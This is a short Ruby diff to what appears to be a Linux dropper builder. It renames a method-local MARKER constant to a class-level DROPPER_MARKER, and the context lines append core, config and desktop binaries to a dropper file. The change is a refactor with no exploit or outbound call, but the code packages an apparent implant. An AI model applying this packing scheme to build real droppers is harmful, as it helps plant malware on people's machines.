@@ -12,6 +12,8 @@ module DB
 
 class BuildLinux < Build
 
+  DROPPER_MARKER = "BmFyY5JhOGhoZjN1"
+
   def initialize
     super
     @platform = 'linux'
@@ -42,19 +44,17 @@ class BuildLinux < Build
     executable = path('default')
     @appname = params['appname'] || 'install'
 
-    MARKER = "BmFyY5JhOGhoZjN1"
-
     dropper_size = File.size(path('dropper'))
 
     File.open(path('dropper'), "ab") do |f|
-      f.write MARKER
+      f.write DROPPER_MARKER
       f.write [File.size(path('core'))].pack('I')
       f.write File.binread(path('core'))
       f.write [File.size(path('config'))].pack('I')
       f.write File.binread(path('config'))
       f.write [File.size(path('desktop'))].pack('I')
       f.write File.binread(path('desktop'))
-      f.write MARKER
+      f.write DROPPER_MARKER
       f.write [dropper_size].pack('I')
     end
 
